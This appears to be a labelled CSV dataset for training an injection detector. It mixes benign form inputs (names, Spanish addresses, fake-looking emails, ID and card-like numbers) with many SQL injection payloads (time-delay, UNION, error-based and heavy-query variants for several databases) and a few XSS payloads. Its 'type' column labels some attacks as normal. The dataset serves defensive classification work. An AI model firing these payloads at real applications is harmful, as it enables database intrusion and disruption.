Text,attack_type,Label,type
c/ de la igualdad 191 8-h,norm,0,normal
38673697w,norm,0,normal
1)) as efjb where 4642=4642 order by 1#,sqli,1,normal
"1%"" or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
0799558149027812,norm,0,normal
45025499d,norm,0,normal
feliu,norm,0,normal
medwin-whittinghill@enla.th,norm,0,normal
estret de sant nicolau s/n,norm,0,normal
1) where 2734=2734 waitfor delay '0:0:5'--,sqli,1,sql
50368,norm,0,normal
"1') where 2120=2120;call regexp_substring(repeat(right(char(3702),0),500000000),null)--",sqli,1,sql
kenna,norm,0,normal
"1' in boolean mode) and exp(~(select * from (select concat(0x7171706a71,(select (elt(8190=8190,1))),0x717a767a71,0x78))x))#",sqli,1,sql
6752701657102360,norm,0,normal
yesenia,norm,0,normal
1755430975595986,norm,0,normal
pedraza de campos,norm,0,normal
"-4319"") where 7534=7534 or 8246=3217",sqli,1,normal
creative,norm,0,normal
03344221k,norm,0,normal
-2241) where 7606=7606 or (8459=8459)*4906--,sqli,1,sql
krug sabet,norm,0,normal
cal,norm,0,normal
incr622to,norm,0,normal
1%')) and (8853=9924)*9924 and (('%'=',sqli,1,normal
ruttmann@quadernideilgarda.dz,norm,0,normal
"-8203)) as eqlf where 6132=6132 union all select 6132,6132,6132,6132,6132,6132,6132,6132,6132--",sqli,1,sql
borgeaud@enmenorca.com.om,norm,0,normal
cryoelec,norm,0,normal
62585578w,norm,0,normal
sabrina,norm,0,normal
1)) as izvy where 2569=2569;begin user_lock.sleep(5); end--,sqli,1,sql
magdalena,norm,0,normal
64115445r,norm,0,normal
nickie,norm,0,normal
6877205573294951,norm,0,normal
"-4462%"") or 8571=8571--",sqli,1,sql
8421938464583223,norm,0,normal
"-9758'+(select 'rlcy' where 3691=3691 union all select 3691,3691,3691,3691,3691,3691,3691--",sqli,1,sql
cifelli,norm,0,normal
<iframe src=http://vulnerability-lab.com>1337+1,xss,2,normal
6olpeador,norm,0,normal
33560,norm,0,normal
ariel,norm,0,normal
"-8777"") as lalf where 8606=8606 or elt(4397=5823,5823)--",sqli,1,sql
"1)));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
d9s1a1i89,norm,0,normal
"1))) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
"1')) as nlfq where 3410=3410 or extractvalue(1297,concat(0x5c,0x7171706a71,(select (elt(1297=1297,1))),0x717a767a71))--",sqli,1,sql
pirscafo,norm,0,normal
"1) where 7775=7775 union all select null,null,null,null--",sqli,1,sql
"1"" and 5556=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and ""epxq"" like ""epxq",sqli,1,sql
menndez coyoma,norm,0,normal
6652639660879846,norm,0,normal
inamulla,norm,0,normal
desc9be35628,norm,0,normal
"1%"");select pg_sleep(5) and (""%""=""",sqli,1,sql
xavier,norm,0,normal
"1%'))(select (case when (4587=4587) then regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) else char(76)||char(65)||char(102)||char(72) end) from (values(0))) and (('%'='",sqli,1,sql
ushiahua,norm,0,normal
narvarte delgado,norm,0,normal
priestley@stockdefotos.vu,norm,0,normal
ibdes,norm,0,normal
"-1513"") as swvd where 2958=2958 union all select 2958,2958,2958--",sqli,1,sql
casillas,norm,0,normal
ixta sole,norm,0,normal
1 where 6523=6523 and 8594=(select 8594 from pg_sleep(5))--,sqli,1,sql
26135,norm,0,normal
"1"" where 3434=3434;select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"-7691"" or 1 group by concat(0x7171706a71,(select (case when (4232=4232) then 1 else 0 end)),0x717a767a71,floor(rand(0)*2)) having min(0)#",sqli,1,sql
1) where 5629=5629;select (case when (8375=8318) then 8375 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
"1')));call regexp_substring(repeat(right(char(3702),0),500000000),null) and ((('leps' like 'leps",sqli,1,sql
mara beln,norm,0,normal
in8ros742tiva,norm,0,normal
15429251t,norm,0,normal
"-2610%"") union all select 7779,7779,7779,7779,7779--",sqli,1,sql
"1"";call regexp_substring(repeat(right(char(3702),0),500000000),null) and ""rugr""=""rugr",sqli,1,sql
3014,norm,0,normal
"1%' and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and '%'='",sqli,1,normal
gering,norm,0,normal
lora@rocofer.jobs,norm,0,normal
"1') where 7658=7658 union all select null,null#",sqli,1,sql
lulio,norm,0,normal
20976629p,norm,0,normal
"carrer panama, 27 8e",norm,0,normal
borio-radichev@lingote.com.gr,norm,0,normal
topham.sperdakos5@forohh.ge,norm,0,normal
cogotillo,norm,0,normal
braddell@cincocolores.cat,norm,0,normal
"manzano, el",norm,0,normal
vish,norm,0,normal
(select (case when (3950=2747) then 1 else 1/(select 0) end)),sqli,1,sql
34116,norm,0,normal
57,norm,0,normal
sagers,norm,0,normal
-5547' or 9323=9323#,sqli,1,normal
"virgen del valle, 40",norm,0,normal
7309058964317313,norm,0,normal
dis0reg2r,norm,0,normal
"c/ tamesis 39, 1?c",norm,0,normal
7447,norm,0,normal
"1%""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"1) as qodq where 4945=4945 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
wardle,norm,0,normal
1%')) rlike (select (case when (6094=7893) then 1 else 0x28 end)) and (('%'=',sqli,1,sql
"1')) as fwhv where 3921=3921 union all select null,null--",sqli,1,sql
"1"") or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3) and (""ctzh""=""ctzh",sqli,1,sql
orr,norm,0,normal
"1%"" or 7417=(select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3)--",sqli,1,sql
"-3017"")) as ljit where 9128=9128 union all select 9128,9128,9128,9128,9128--",sqli,1,sql
06310,norm,0,normal
"1' and char(111)||char(77)||char(121)||char(88)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and 'bpbe' like 'bpbe",sqli,1,normal
1140,norm,0,normal
robledollano,norm,0,normal
"1 and row(6237,7469)>(select count(*),concat(0x7171706a71,(select (elt(6237=6237,1))),0x717a767a71,floor(rand(0)*2))x from (select 5192 union select 3785 union select 3931 union select 7158)a group by x)-- ofqd",sqli,1,sql
389,norm,0,normal
12192,norm,0,normal
bembibre,norm,0,normal
"1"") as uorp where 7208=7208;select (case when (5198=2518) then 5198 else cast(1 as int)/(select 0 from dual) end) from dual--",sqli,1,sql
queso manchego,norm,0,normal
t0na5t44la,norm,0,normal
43736952z,norm,0,normal
caminomorisco,norm,0,normal
kuilan velugo,norm,0,normal
49540097y,norm,0,normal
1819477389412406,norm,0,normal
"-7843' where 5986=5986 or make_set(9354=9354,7185)--",sqli,1,sql
rayner,norm,0,normal
"-1015"")) union all select 6624,6624#",sqli,1,sql
1'||(select 'pxkz' where 2207=2207 and (3020=3020)*6703)||',sqli,1,sql
1')) waitfor delay '0:0:5' and (('jcfe'='jcfe,sqli,1,normal
"1')) as kxek where 3429=3429 or 6979=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
"-7601""))) union all select 1293,1293,1293,1293,1293,1293,1293,1293--",sqli,1,sql
"-7238%' or make_set(5375=9563,9563) and '%'='",sqli,1,normal
karelsen_cisar@seramitex.nu,norm,0,normal
regenta,norm,0,normal
"pobla de crvoles, la",norm,0,normal
"1 where 8905=8905 and make_set(7654=1923,1923)--",sqli,1,sql
05458,norm,0,normal
"calle lirios, 51, 3?a",norm,0,normal
san cibrao das vias,norm,0,normal
h9erc5,norm,0,normal
"1' or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a) and 'akki'='akki",sqli,1,sql
"1';select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and 'kiex'='kiex",sqli,1,sql
7043934218522889,norm,0,normal
17652259n,norm,0,normal
isador,norm,0,normal
<!-- -- --><script>alert('xss');</script><!-- -- -->,xss,2,xss
montroy,norm,0,normal
sims2@videocasa-ebs.ru,norm,0,normal
llinas rufi,norm,0,normal
"1'))) or 2633=dbms_pipe.receive_message(chr(112)||chr(65)||chr(65)||chr(103),5) and ((('ochr' like 'ochr",sqli,1,normal
20491,norm,0,normal
portomarn,norm,0,normal
"1%'))) union all select null,null,null,null,null,null,null#",sqli,1,sql
villar del ro,norm,0,normal
wackers_donlin@gesautonomos.bh,norm,0,normal
maisa,norm,0,normal
"1) as mnyy where 4409=4409 union all select null,null,null,null--",sqli,1,sql
"1"")) as jgie where 8017=8017 and (select * from (select(sleep(5)))fzno)--",sqli,1,sql
"-2305' in boolean mode) union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",sqli,1,sql
des7768ab9e6os,norm,0,normal
virginia,norm,0,normal
50004,norm,0,normal
1'||(select 'rjun' where 8868=8868 and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113))))||',sqli,1,sql
">""<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>",xss,2,xss
"-3501""))) or (6789=6990)*6990 and (((""jnnc"" like ""jnnc",sqli,1,normal
"1') or exp(~(select * from (select concat(0x7171706a71,(select (elt(6270=6270,1))),0x717a767a71,0x78))x)) and ('efwq' like 'efwq",sqli,1,sql
6905236399041419,norm,0,normal
"1 and (select 2*(if((select * from (select concat(0x7171706a71,(select (elt(3484=3484,1))),0x717a767a71,0x78))s), 8446744073709551610, 8446744073709551610)))",sqli,1,sql
1) and (3020=3020)*6703,sqli,1,normal
homan,norm,0,normal
"1"" and 7756=dbms_utility.sqlid_to_sqlhash((chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (7756=7756) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))) and ""qqfd"" like ""qqfd",sqli,1,sql
rodvold@mytanga.om,norm,0,normal
-9331' or (4519=2912)*2912 and 'rddk'='rddk,sqli,1,normal
8025245569299513,norm,0,normal
5068023807822442,norm,0,normal
"-9023%""))) union all select 4490,4490,4490#",sqli,1,sql
-6045 or 8919=2827--,sqli,1,sql
jub0lo2o,norm,0,normal
"-5539"") union all select 6189,6189,6189,6189,6189,6189,6189,6189,6189--",sqli,1,sql
"ventas de retamosa, las",norm,0,normal
"1') and make_set(7187=4625,4625) and ('diai' like 'diai",sqli,1,normal
"1')));iif(5257=5257,1,1/0)",sqli,1,sql
agatn,norm,0,normal
tas9go,norm,0,normal
"1%') union all select null,null,null,null--",sqli,1,sql
mitjans,norm,0,normal
"1%')) and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and (('%'='",sqli,1,normal
06918701w,norm,0,normal
gerola pugliesi,norm,0,normal
campament 33,norm,0,normal
"1%"") or sleep(5) and (""%""=""",sqli,1,normal
-7962')) as pgqz where 6058=6058 or 4493=utl_inaddr.get_host_address(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (4493=4493) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113))--,sqli,1,sql
aldemar,norm,0,normal
"1"" and 3715 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (3715=3715) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
"palanca 106,",norm,0,normal
ma2o4esa,norm,0,normal
1%';begin dbms_lock.sleep(5); end and '%'=',sqli,1,sql
"c/ lorenzo solano tendero, s/n 8b",norm,0,normal
ohala,norm,0,normal
artillera,norm,0,normal
anglaril,norm,0,normal
"1) union all select null,null,null,null,null,null,null,null,null,null#",sqli,1,sql
belver,norm,0,normal
lakshmin,norm,0,normal
1 where 8214=8214 and 2853=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (2853=2853) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric)--,sqli,1,sql
"1"" and 6537=dbms_pipe.receive_message(chr(76)||chr(116)||chr(117)||chr(65),5) and ""icow"" like ""icow",sqli,1,normal
"""javascript:alert(1)"">x</button>",xss,2,xss
bilal,norm,0,normal
5695809811217784,norm,0,normal
"avinguda doctor vilaseca, s/n,",norm,0,normal
"1"");iif(5257=5257,1,1/0)",sqli,1,sql
palencia,norm,0,normal
puvilom@vitalhome.wf,norm,0,normal
"-5043%'))) union all select 5860,5860,5860,5860,5860#",sqli,1,sql
1%')) and sleep(5)#,sqli,1,normal
"1')));select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ((('jutx'='jutx",sqli,1,sql
1') where 5280=5280 and 4595=4595#,sqli,1,normal
26292,norm,0,normal
"1')) as peeo where 5356=5356 and elt(4722=2382,2382)--",sqli,1,sql
"-1432"")) union all select 9008,9008,9008#",sqli,1,sql
ca10a5uda,norm,0,normal
1041858100277526,norm,0,normal
montanuy,norm,0,normal
"1%');select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
cracoviano,norm,0,normal
babasaki,norm,0,normal
5515498437464021,norm,0,normal
"calle carre clot 93,",norm,0,normal
"1"")));(select * from (select(sleep(5)))srmq) and (((""eakt"" like ""eakt",sqli,1,sql
adolfo,norm,0,normal
17300,norm,0,normal
649bonata5,norm,0,normal
"1 where 5332=5332 or (select 9173 from(select count(*),concat(0x7171706a71,(select (elt(9173=9173,1))),0x717a767a71,floor(rand(0)*2))x from information_schema.character_sets group by x)a)--",sqli,1,sql
respl.andeciente,norm,0,normal
"-9566%"") union all select 7973,7973,7973,7973--",sqli,1,sql
crous zuta,norm,0,normal
8879069271917222,norm,0,normal
"-2920"")) as zdgv where 9702=9702 or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))--",sqli,1,sql
okura4,norm,0,normal
mockus@twinjet.hr,norm,0,normal
"parque barranco de coquin 67, 8?d",norm,0,normal
61947998m,norm,0,normal
3324392405940394,norm,0,normal
1);select (case when (6276=6276) then 6276 else 6276*(select 6276 from information_schema.character_sets) end)#,sqli,1,sql
quintela de leirado,norm,0,normal
"1%"" and (select * from (select(sleep(5)))gcrr)#",sqli,1,sql
bly7,norm,0,normal
alkin@lesionesmusculares.pf,norm,0,normal
ptok@aou.com.th,norm,0,normal
5388028127449105,norm,0,normal
-9509'))) or 1091=5477 and ((('gsmz'='gsmz,sqli,1,normal
5966,norm,0,normal
78739097t,norm,0,normal
"-5027%"")) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and ((""%""=""",sqli,1,sql
"1') where 7252=7252;select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
"perdign, el",norm,0,normal
coderch gordo,norm,0,normal
hildebaldo,norm,0,normal
"avenida de europa 153,",norm,0,normal
"1') where 8268=8268 union all select null,null,null,null--",sqli,1,sql
0437949521333484,norm,0,normal
33470889r,norm,0,normal
pastelear,norm,0,normal
"1"") as wmng where 5976=5976;select count(*) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3--",sqli,1,sql
brocato,norm,0,normal
85765253r,norm,0,normal
beique,norm,0,normal
shanta,norm,0,normal
07485924e,norm,0,normal
62746544z,norm,0,normal
3933219208280602,norm,0,normal
"elt(2567=9921,9921)",sqli,1,normal
corts,norm,0,normal
hortigela,norm,0,normal
"tierra s/n, 4e",norm,0,normal
19583,norm,0,normal
"-5322"" union all select 6494,6494,6494,6494,6494,6494--",sqli,1,sql
"-8245"")) or 3038=3038",sqli,1,normal
"1"") where 2680=2680 or elt(5873=5873,sleep(5))#",sqli,1,normal
06227,norm,0,normal
aylmar6,norm,0,normal
2x334ma81va,norm,0,normal
parnesi3,norm,0,normal
7895531711840476,norm,0,normal
6485,norm,0,normal
enri,norm,0,normal
ticiana,norm,0,normal
43785,norm,0,normal
yolanda,norm,0,normal
monte9a,norm,0,normal
676,norm,0,normal
"1""))) or char(68)||char(69)||char(97)||char(85)=regexp_substring(repeat(right(char(5389),0),5000000000),null) and (((""fpwu"" like ""fpwu",sqli,1,normal
"-1573"") union all select 3928,3928,3928,3928--",sqli,1,sql
$despumar,norm,0,normal
1'));select sleep(5) and (('srfc' like 'srfc,sqli,1,sql
62776679l,norm,0,normal
yasna,norm,0,normal
griffith,norm,0,normal
"-3933%"")) or elt(8142=2978,2978) and ((""%""=""",sqli,1,normal
castell de farfanya,norm,0,normal
2es8i1g73,norm,0,normal
"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",sqli,1,sql
"paseo marinero luis de torres, 81, 4?e",norm,0,normal
37167690n,norm,0,normal
1')) as vnwn where 8774=8774 and (select * from (select(sleep(5)))gcrr)#,sqli,1,sql
canudes,norm,0,normal
c/ galicia 50 5e,norm,0,normal
casals oficial,norm,0,normal
"1'||(select 'xtcb' where 5240=5240;call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null))||'",sqli,1,sql
"-2766%')) union all select 4458,4458,4458,4458,4458--",sqli,1,sql
3483759032039074,norm,0,normal
"1;select dbms_pipe.receive_message(chr(66)||chr(67)||chr(79)||chr(101),5) from dual-- vykx",sqli,1,sql
50sc2e3i6i1172,norm,0,normal
fredriks,norm,0,normal
"-4045 union all select 6857,6857,6857,6857,6857,6857,6857--",sqli,1,sql
"1""))) and 8148=like('abcdefg',upper(hex(randomblob(500000000/2))))--",sqli,1,sql
1')) as cjjm where 1981=1981;select (case when (4660=4660) then 4660 else cast(1 as int)/(select 0 from dual) end) from dual--,sqli,1,sql
lonidas,norm,0,normal
"sentis 6,",norm,0,normal
5287631327187373,norm,0,normal
"-1964') as ihsp where 6379=6379 or elt(6945=6165,6165)--",sqli,1,sql
"1')) as dtwh where 9633=9633 and char(109)||char(79)||char(70)||char(90)=regexp_substring(repeat(right(char(5012),0),5000000000),null)--",sqli,1,sql
3972,norm,0,normal
7ra0sp64t9r,norm,0,normal
"av. sol 196, 6?d",norm,0,normal
nedra,norm,0,normal
noble monteys,norm,0,normal
"1') where 8948=8948 and 8635=(select count(*) from generate_series(1,5000000))--",sqli,1,sql
1')) as plgq where 1121=1121;select pg_sleep(5)--,sqli,1,sql
"sugranyes, 166,",norm,0,normal
"1' and extractvalue(7982,concat(0x5c,0x7171706a71,(select (elt(7982=7982,1))),0x717a767a71)) and 'lgat' like 'lgat",sqli,1,sql
guayabo,norm,0,normal
><img id=xss src=x onerror=alert(xss);>,xss,2,xss
48210,norm,0,normal
crispn,norm,0,normal
c/ dionisio acebal 41,norm,0,normal
buddie,norm,0,normal
"1%"")));select case when 7717=7717 then 1 else null end--",sqli,1,sql
5251,norm,0,normal
"1 or 9643=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)-- lxey",sqli,1,sql
valdivieso,norm,0,normal
"1"" union all select null,null,null,null,null,null,null,null,null--",sqli,1,sql
natal,norm,0,normal
44578051a,norm,0,normal
"calle llorente, 73,",norm,0,normal
elizarzu aguilocho,norm,0,normal
"1%""));select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4--",sqli,1,sql
"1%')));select benchmark(5000000,md5(0x4c4d6142)) and ((('%'='",sqli,1,sql
"-5275%')) union all select 9382,9382,9382,9382,9382,9382,9382,9382,9382,9382--",sqli,1,sql
a8ique0r4r,norm,0,normal
7608,norm,0,normal
desplume,norm,0,normal
"1%"" and 4595=4595#",sqli,1,normal
9322365663955939,norm,0,normal
"1"") as ghpx where 2873=2873 waitfor delay '0:0:5'--",sqli,1,sql
6920897670834539,norm,0,normal
"<img id=xss src=""mocha:[code]"">",xss,2,normal
-8069')) or 3440=cast((chr(113)||chr(113)||chr(112)||chr(106)||chr(113))||(select (case when (3440=3440) then 1 else 0 end))::text||(chr(113)||chr(122)||chr(118)||chr(122)||chr(113)) as numeric) and (('qbvz'='qbvz,sqli,1,sql
"1))) and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4) and (((4744=4744",sqli,1,sql
bryant,norm,0,normal
4599,norm,0,normal
50171,norm,0,normal
1%';select (case when (7271=1658) then 7271 else 7271*(select 7271 from information_schema.character_sets) end)#,sqli,1,sql
oliverio,norm,0,normal
scotty,norm,0,normal
berroteran,norm,0,normal
oliveras dotras,norm,0,normal
lopez castrillon 162,norm,0,normal
cabildeo,norm,0,normal
26540,norm,0,normal
tapani9,norm,0,normal
harrold_elloy@santacruzdelvoto.ci,norm,0,normal
"1') as chla where 6098=6098;select benchmark(5000000,md5(0x4c4d6142))--",sqli,1,sql
"-9098' union all select 3476,3476,3476,3476,3476,3476#",sqli,1,sql
mehd3,norm,0,normal
"1"" and char(107)||char(121)||char(97)||char(80)=regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null)--",sqli,1,sql
encad7622i6,norm,0,normal
li74re04,norm,0,normal
"1') where 3271=3271 and 6055=ctxsys.drithsx.sn(6055,(chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (6055=6055) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)))--",sqli,1,sql
"1"") where 7578=7578 and 6414=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"calle ainsas 174, 11e",norm,0,normal
sobrecejo,norm,0,normal
1526,norm,0,normal
8270545725750345,norm,0,normal
"1'||(select 'sned' where 4957=4957 and 9254=(select count(*) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4)--",sqli,1,sql
"1"" where 7022=7022;select (case when (7822=4430) then 7822 else 1/(select 0) end)--",sqli,1,sql
47649,norm,0,normal
15280766a,norm,0,normal
"1);select dbms_pipe.receive_message(chr(112)||chr(70)||chr(106)||chr(78),5) from dual--",sqli,1,sql
43812,norm,0,normal
1 rlike (select * from (select(sleep(5)))vwyq)#,sqli,1,sql
"1')) or 5286=(select count(*) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5) and (('esma' like 'esma",sqli,1,sql
28850,norm,0,normal
cesarin,norm,0,normal
"1"") where 4520=4520;select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3--",sqli,1,sql
-4325 order by 1--,sqli,1,sql
arditi-alexis@capitalinvest.vc,norm,0,normal
patchit,norm,0,normal
taburete,norm,0,normal
filemn,norm,0,normal
7219,norm,0,normal
ellswort,norm,0,normal
8omba51a,norm,0,normal
"1))) or char(119)||char(100)||char(99)||char(121)=regexp_substring(repeat(right(char(1441),0),5000000000),null)--",sqli,1,sql
justis8,norm,0,normal
34111,norm,0,normal
"1%"" or 8421=(select count(*) from generate_series(1,5000000)) and ""%""=""",sqli,1,sql
"1""))) and 3580=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
70304292p,norm,0,normal
cen,norm,0,normal
1' in boolean mode) or 6793=(select 6793 from pg_sleep(5))#,sqli,1,sql
cerratn de juarros,norm,0,normal
bisaurri,norm,0,normal
werkmeister@19horas.zr,norm,0,normal
"1' or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"pasaje pedrosa 115, 6f",norm,0,normal
43791,norm,0,normal
1424,norm,0,normal
44141,norm,0,normal
zorita de la frontera,norm,0,normal
19260,norm,0,normal
mino@showcarsmadrid.com.zm,norm,0,normal
calle palencia s/n,norm,0,normal
papa@opel-e-flex.cg,norm,0,normal
goldman@casabolsa43.rw,norm,0,normal
"-9558"" where 7497=7497 or (2539=6484)*6484--",sqli,1,sql
1'+(select oljg where 2006=2006 and 3754=(select upper(xmltype(chr(60)||chr(58)||chr(113)||chr(113)||chr(112)||chr(106)||chr(113)||(select (case when (3754=3754) then 1 else 0 end) from dual)||chr(113)||chr(122)||chr(118)||chr(122)||chr(113)||chr(62))) from dual))+',sqli,1,sql
cercedilla,norm,0,normal
"olmos, los",norm,0,normal
l4t9rgo,norm,0,normal
lozier,norm,0,normal
"plaa doctor robert, 127",norm,0,normal
9729,norm,0,normal
13590,norm,0,normal
c/ cubillo aragon 45,norm,0,normal
15495714q,norm,0,normal
"1))) or 5356=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
plang_schallert@white-pearl-resort.kp,norm,0,normal
"1'||(select 'bnaz' from dual where 7168=7168 and 2716=(select count(*) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7)--",sqli,1,sql
1'||(select 'bwqc' from dual where 6897=6897 and sleep(5)#,sqli,1,sql
"-7333%""))) or 5903=('qqpjq'||(select case 5903 when 5903 then 1 else 0 end from rdb$database)||'qzvzq') and (((""%""=""",sqli,1,sql
calaceite,norm,0,normal
0utaperc09,norm,0,normal
llaveria magnieto,norm,0,normal
02143129n,norm,0,normal
49126,norm,0,normal
2510637221475671,norm,0,normal
"calle can bordoi, 148",norm,0,normal
5109006060601152,norm,0,normal
aseguir,norm,0,normal
"1)) as henn where 9980=9980 or 4915=(select count(*) from domain.domains as t1,domain.columns as t2,domain.tables as t3)--",sqli,1,sql
"-8538"" or 2724 in ((char(113)+char(113)+char(112)+char(106)+char(113)+(select (case when (2724=2724) then char(49) else char(48) end))+char(113)+char(122)+char(118)+char(122)+char(113)))",sqli,1,sql
iwasaki@chaqueta.com.asia,norm,0,normal
"-6587') union all select 6349,6349,6349,6349,6349,6349,6349,6349,6349,6349--",sqli,1,sql
"1"")) union all select null,null,null,null,null,null--",sqli,1,sql
"-5493"")) union all select 8001,8001--",sqli,1,sql
31370,norm,0,normal
"1"") rlike (select * from (select(sleep(5)))sgvo) and (""cneo"" like ""cneo",sqli,1,sql
setin cardona,norm,0,normal
jurez,norm,0,normal
"1%');call regexp_substring(repeat(left(crypt_key(char(65)||char(69)||char(83),null),0),500000000),null) and ('%'='",sqli,1,sql
daughtre3,norm,0,normal
blakley@asyra.ao,norm,0,normal
47183,norm,0,normal
gourtchenko@cirujanaplastica.nl,norm,0,normal
greco_manon1@hacia.yu,norm,0,normal
?malgastador,norm,0,normal
31j21o,norm,0,normal
"-2028'))) union all select 8698,8698,8698,8698#",sqli,1,sql
9202478257950133,norm,0,normal
26526,norm,0,normal
crabe,norm,0,normal
elstica,norm,0,normal
nader,norm,0,normal
20629413t,norm,0,normal
"c/ portal de zamudio 65,",norm,0,normal
"1') and 3824=benchmark(5000000,md5(0x76555642))",sqli,1,normal
krisha,norm,0,normal
adalino,norm,0,normal
pembrooke_coates@stainless.gd,norm,0,normal
">""<div style=""background-image: url(javascript:document.cookie=true;);"">",xss,2,xss
1) as bidc where 5268=5268 and (select * from (select(sleep(5)))fzno)--,sqli,1,sql
damisa,norm,0,normal
"camio do monte 147, 10?h",norm,0,normal
stadler_munks@chevrolet-volt.at,norm,0,normal
"1')));select * from generate_series(4592,4592,case when (4592=4592) then 1 else 0 end) limit 1--",sqli,1,sql
stahel,norm,0,normal
olmos de esgueva,norm,0,normal
"-9289)) or make_set(5101=9919,9919) and ((8977=8977",sqli,1,normal
